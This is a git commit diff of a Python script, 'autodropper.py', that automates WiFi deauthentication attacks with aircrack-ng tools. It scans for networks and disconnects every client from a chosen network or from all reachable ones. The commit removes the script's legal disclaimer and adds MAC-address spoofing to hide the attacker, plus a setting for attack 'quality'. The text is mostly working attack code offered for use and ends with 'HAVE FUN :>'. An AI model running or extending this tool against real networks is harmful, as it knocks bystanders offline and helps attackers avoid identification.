30dbbf91fa594c087ecf25d9f06e1b9af62dd8ad
hsrv <ahusrevceker@gmail.com>
2020-10-29 14:12:42 +0300

    Solved lots of problems & Added a few features
    Solved lots of problems & Added a few features which are usable, strong and cool :>
    
    New features:
    +Now, you can change your MAC address by giving an address you want with -m or --mac parameter.
    +Now, you can change quality of the attack by giving number between 1 and 20 with -q or --quality parameter.

--- autodropper.py
+++ autodropper.py
@@ -1,15 +1,13 @@
-'''Important Note:
-It is illegal to monitor and / or record interpersonal communication without providing the necessary procedures, and committing this act constitutes a crime.
-
-The users are deemed to have accepted the legal liabilities, material, moral and any possible damages that may arise from the legal and illegal use of this tool, and the developers cannot be held responsible in any way.
-
-Any damages and liabilities arising from the use of this code belong to the users.'''
-
 import subprocess
 import os
 import time
-import sqlite3
 import optparse
+import apt
+import re
+try:
+    import sqlite3
+except ImportError:
+    print("sqlite3 is not installed!")
 
 CRED = '\033[41m'
 CEND = '\033[0m'
@@ -33,24 +31,61 @@ print(text)
 print("\nHi jumppy :>\n\n")
 
 
+def is_package_installed(*args):
+    counter = 0
+    cache = apt.Cache()
+    for package_name in args:
+        if cache[package_name].is_installed:
+            counter += 1
+        else:
+            print(f"{package_name} is not installed!")
+    if counter == len(args):
+        return True
+    else:
+        return False
+    
 def get_user_input():
     parse_object = optparse.OptionParser()
     parse_object.add_option("-t","--target", dest="targetname", type=str, help="Specific target name to be attacked!\nIf all then do not use this parameter!")
-    parse_object.add_option("-n","--number", dest="number_of_packages",type=int, help="How many packages will be sent to the target(s)!(0=unlimited)")
+    parse_object.add_option("-n","--number", dest="number_of_packages",type=int, default=0, help="How many packages will be sent to the target(s)!(default=0=unlimited)")
+    parse_object.add_option("-m","--mac",dest="mac_address",type=str, help="Temporary new MAC address.")
+    parse_object.add_option("-q", "--quality", dest="quality_of_the_attack", type=int, default=1, help="Enter a number between 1 and 20. The higher the number, the higher the quality of the attack as well as the time taken!\n(default=1)")
 
     return parse_object.parse_args()
 
-def getInterfaceName():
+def change_mac_address(mac_address):
+        interface_name = get_interface_name()
+        if is_monitor():
+            re_eneable_managedmode(interface_name)
+            time.sleep(5)
+        interface_name = get_interface_name()
+        subprocess.call(["ifconfig", interface_name,"down"])
+        time.sleep(1)
+        subprocess.call(["ifconfig", interface_name,"hw","ether", mac_address])
+        time.sleep(1)
+        subprocess.call(["ifconfig", interface_name,"up"])
+        time.sleep(5)
+        
+def control_new_mac(interface_name):
+    ifconfig = subprocess.check_output(["ifconfig", interface_name])
+    print(ifconfig)
+    new_mac = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", str(ifconfig))
+    if new_mac:
+        return new_mac.group(0)
+    else:
+        return None
+
+def get_interface_name():
     process_of_interface_output = subprocess.getoutput("iw dev | grep Interface")
     interface_name = process_of_interface_output.split("\n")[0]  # Searching for interface name
     interface_name = interface_name[11:]  # Getting the name only
 
-    return interface_name
+    return str(interface_name)
 
-def changeMod(interface_name):
+def change_interface_mod(interface_name):
     os.system("airmon-ng start " + interface_name)
 
-def isMonitor():
+def is_monitor():
     process_of_type_output = subprocess.getoutput("iw dev | grep type")
     type_of_card = process_of_type_output.split("\n")[0]
     type_of_card = type_of_card[7:]
@@ -58,22 +93,24 @@ def isMonitor():
     if type_of_card == 'monitor':
         return True
     if type_of_card == 'managed':
-        print("\nYou may want change your type of network card manually.")
+        print("\nYou may want to change the mod of your WIFI card manually.")
         return False
 
-def scanNetwork(interface_name_monitor):
+def scan_network(interface_name_monitor):
     print("Scanning...")
     files_first = os.listdir("./firstScan")
     number_of_files_first = len(files_first)
-    os.system(f"timeout -s 9 10 airodump-ng -w ./firstScan/output_of_scan{number_of_files_first} --output-format kismet.csv {interface_name_monitor}")
+    os.system(f"gnome-terminal -- timeout -s 9 10 airodump-ng -w ./firstScan/output_of_scan{number_of_files_first} --output-format kismet.csv {interface_name_monitor}")
+    sleep(10)
 
-def scanAllnetwork(interface_name_monitor):
+def scan_all_network(interface_name_monitor):
     print("Scanning...")
     files_allf = os.listdir("./allScan/allfScan")
     number_of_files_allf = len(files_allf)
-    os.system(f"timeout -s 9 10 airodump-ng -w ./allScan/allfScan/output_of_scan{number_of_files_allf} --output-format kismet.csv {interface_name_monitor}")
+    os.system(f"gnome-terminal -- timeout -s 9 10 airodump-ng -w ./allScan/allfScan/output_of_scan{number_of_files_allf} --output-format kismet.csv {interface_name_monitor}")
+    sleep(10)
 
-def getTargets(db_name):
+def get_targets(db_name):
 
     conn = sqlite3.connect(db_name)
     c = conn.cursor()
@@ -88,7 +125,7 @@ def getTargets(db_name):
 
     return macs, channels
 
-def getData(db_name):
+def get_bssid_and_channel(db_name):
     conn = sqlite3.connect(db_name)
     c = conn.cursor()
 
@@ -102,21 +139,23 @@ def getData(db_name):
 
     return bssid, channel
 
-def scanDevices(interface_name_monitor, bssid, channel):
+def scan_devices(interface_name_monitor, bssid, channel):
     print("Scanning...")
     channel = str(channel)
     files_second = os.listdir("./secondScan")
     number_of_files_second = len(files_second)
-    os.system(f"timeout -s 9 15 airodump-ng -c {channel} --bssid {bssid} -w ./secondScan/output_of_scan{number_of_files_second} --output-format csv {interface_name_monitor}")
+    os.system(f"gnome-terminal -- timeout -s 9 15 airodump-ng -c {channel} --bssid {bssid} -w ./secondScan/output_of_scan{number_of_files_second} --output-format csv {interface_name_monitor}")
+    sleep(15)
 
-def scanDevicesforAll(interface_name_monitor, bssid, channel):
+def scan_devices_for_all(interface_name_monitor, bssid, channel):
     print("Scanning...")
     channel = str(channel)
     files_alls = os.listdir("./allScan/allsScan")
     number_of_files_alls = len(files_alls)
-    os.system(f"timeout -s 9 15 airodump-ng -c {channel} --bssid {bssid} -w ./allScan/allsScan/output_of_scan{number_of_files_alls} --output-format csv {interface_name_monitor}")
+    os.system(f"gnome-terminal -- timeout -s 9 15 airodump-ng -c {channel} --bssid {bssid} -w ./allScan/allsScan/output_of_scan{number_of_files_alls} --output-format csv {interface_name_monitor}")
+    sleep(15)
 
-def getWIFIname(db_name):
+def get_wifi_name(db_name):
     conn = sqlite3.connect(db_name)
     c = conn.cursor()
     names = f"""SELECT ESSID FROM dump"""
@@ -124,7 +163,7 @@ def getWIFIname(db_name):
     names = c.fetchall()
     return names
 
-def getMACs(db_name):
+def get_mac_addresses(db_name):
     conn = sqlite3.connect(db_name)
     c = conn.cursor()
     macs = f"""SELECT StationMAC FROM dump"""
@@ -137,41 +176,69 @@ def drop(device_mac, network_mac, interface_name_monitor):
     print(device_mac)
     os.system(f"gnome-terminal -- aireplay-ng -0 {number_of_packages} -a {network_mac} -c {device_mac} --ignore-negative-one {interface_name_monitor}")
 
+def sleep(during):
+    during += quality_of_the_attack * 1.5
+    time.sleep(during)
+    
 def clean():
     os.system("rm -rf firstScan/o*")
     os.system("rm -rf secondScan/o*")
     os.system("rm -rf allScan/allfScan/o*")
     os.system("rm -rf allScan/allsScan/o*")
 
-def re_eneable_managedmode():
-    os.system(f"airodump-ng stop {interface_name_monitor}")
+def re_eneable_managedmode(interface_name_monitor):
+    os.system(f"airmon-ng stop {interface_name_monitor}")
 
+
+
+
+
+if is_package_installed("sqlite3", "aircrack-ng", "gnome-terminal", "net-tools"):
+    print("All packages we need are installed.\n")
+else:
+    exit("Stopped because of not-installed packages!\n")
 
 (user_input,arguments) = get_user_input()
-targetname, number_of_packages = user_input.targetname, user_input.number_of_packages
-    
-print(f"Options:\nTarget: {targetname} (None=all)\nPackage quantity: {number_of_packages}")
+targetname, number_of_packages, mac_address, quality_of_the_attack = user_input.targetname, user_input.number_of_packages, user_input.mac_address, user_input.quality_of_the_attack
+
+if quality_of_the_attack < 1 or quality_of_the_attack > 20:
+    exit("The quality value is NOT valid! Enter a number between 1 and 20! ")
+
+interface_name = get_interface_name()
+if not mac_address is None:
+    change_mac_address(mac_address)
+finalized_mac = control_new_mac(str(get_interface_name()))
+if finalized_mac == mac_address:
+    print("\nMAC address was changed successfully!\n")
+else:
+    print(CRED + "\nMAC address could NOT changed!!" + CEND)
+    wanna_c = input("Wanna continue without changing your MAC address. This can be dangerous![Y/n]: ")
+    if wanna_c == "n":
+        exit("Stopped!")
+        
+print(f"\n\nOptions:\nTarget: {targetname} (None=all)\nPackage quantity: {number_of_packages}\nYour MAC address: {control_new_mac(get_interface_name())}")
 print(CRED + "\nAre you sure to start the attack with the above settings?[Y/n]" + CEND)
 sure = input("\n: ")
 s = ["y", "Y", ""]
 if sure not in s:
-    exit()
+    exit("Stopped!")
+
+
+
 
 clean()
+if not is_monitor():
+    change_interface_mod(get_interface_name())
 
-interface_name = getInterfaceName()
-print(interface_name)
-changeMod(interface_name)
-
-if isMonitor():
+if is_monitor():
     print("The mode has changed to monitor instead of managed.")
-    interface_name_monitor = interface_name
+    interface_name_monitor = get_interface_name()
 
     if targetname == None:
         print("All WIFI that the WIFI card can reach have been chosen as target!")
         time.sleep(1)
         # ALL SCAN
-        scanAllnetwork(interface_name_monitor)
+        scan_all_network(interface_name_monitor)
         files_allf = os.listdir("./allScan/allfScan")
         number_of_files_allf = len(files_allf)
         os.system(f"./kismet2sqlite.sh ./allScan/allfScan/output_of_scan{number_of_files_allf - 1}-01.kismet.csv")
@@ -180,8 +247,8 @@ if isMonitor():
         os.system(f"rm -r ./allScan/allfScan/output_of_scan{number_of_files_allf - 1}-01.kismet.csv")
 
         db_name = f"./allScan/allfScan/output_of_scan{number_of_files_allf - 1}-01.kismet.csv.db"
-        targets, channels = getTargets(db_name)
-        names = getWIFIname(db_name)
+        targets, channels = get_targets(db_name)
+        names = get_wifi_name(db_name)
 
         for i in range(0, len(targets)):
 
@@ -195,7 +262,7 @@ if isMonitor():
             channel = channel[1:-2]
             print(channel)
 
-            scanDevicesforAll(interface_name_monitor, bssid, channel)
+            scan_devices_for_all(interface_name_monitor, bssid, channel)
             files_alls = os.listdir("./allScan/allsScan")
             number_of_files_alls = len(files_alls)
             os.system(f"./kismet3sqlite.sh ./allScan/allsScan/output_of_scan{number_of_files_alls - 1}-01.csv")
@@ -204,7 +271,7 @@ if isMonitor():
             os.system(f"rm -r ./allScan/allsScan/output_of_scan{number_of_files_alls - 1}-01.csv")
 
             db_name = f"./allScan/allsScan/output_of_scan{number_of_files_alls - 1}-01.csv.db"
-            macs = getMACs(db_name)
+            macs = get_mac_addresses(db_name)
             print(macs)
             counter = 0
             for mac in macs:
@@ -220,7 +287,7 @@ if isMonitor():
                     time.sleep(1)
         if counter == len(macs):
             print(CRED + "All devices have been dropped from the WIFI you chose!" + CEND + "\nHAVE FUN :>")
-        re_enable = input("Wanna re-enable managed mode?[Y/n]")
+        re_enable = input("Wanna re-enable managed mode?[Y/n]:\n")
         if re_enable in s:
             re_eneable_managedmode()
             print("Setting your wifi card to its old settings.")
@@ -231,7 +298,7 @@ if isMonitor():
         print(f"'{targetname}' has been chosen as target!")
         time.sleep(1)
         ## FIRST SCAN
-        scanNetwork(interface_name_monitor)
+        scan_network(interface_name_monitor)
         files_first = os.listdir("./firstScan")
         number_of_files_first = len(files_first)
         os.system(f"./kismet2sqlite.sh ./firstScan/output_of_scan{number_of_files_first - 1}-01.kismet.csv")
@@ -240,11 +307,11 @@ if isMonitor():
         os.system(f"rm -r ./firstScan/output_of_scan{number_of_files_first - 1}-01.kismet.csv")
 
         db_name = f"./firstScan/output_of_scan{number_of_files_first - 1}-01.kismet.csv.db"
-        bssid, channel = getData(db_name)
+        bssid, channel = get_bssid_and_channel(db_name)
         print(bssid, channel)
 
         # SECOND SCAN
-        scanDevices(interface_name_monitor, bssid, channel)
+        scan_devices(interface_name_monitor, bssid, channel)
         files_second = os.listdir("./secondScan")
         number_of_files_second = len(files_second)
         os.system(f"./kismet3sqlite.sh ./secondScan/output_of_scan{number_of_files_second - 1}-01.csv")
@@ -253,7 +320,7 @@ if isMonitor():
         os.system(f"rm -r ./secondScan/output_of_scan{number_of_files_second - 1}-01.csv")
 
         db_name = f"./secondScan/output_of_scan{number_of_files_second - 1}-01.csv.db"
-        macs = getMACs(db_name)
+        macs = get_mac_addresses(db_name)
         print(macs)
         counter = 0
 
@@ -270,9 +337,9 @@ if isMonitor():
                 time.sleep(1)
         if counter == len(macs):
             print(CRED + "All devices have been dropped from the WIFI you chose!" + CEND + "\nHAVE FUN :>")
-        re_enable = input("Wanna re-enable managed mode?[Y/n]")
+        re_enable = input("Wanna re-enable managed mode?[Y/n]:\n")
         if re_enable in s:
-            re_eneable_managedmode()
+            re_eneable_managedmode(interface_name_monitor)
             print("Setting your wifi card to its old settings.")
             time.sleep(3)
             print("Your network can usable now! Have a good one c:")
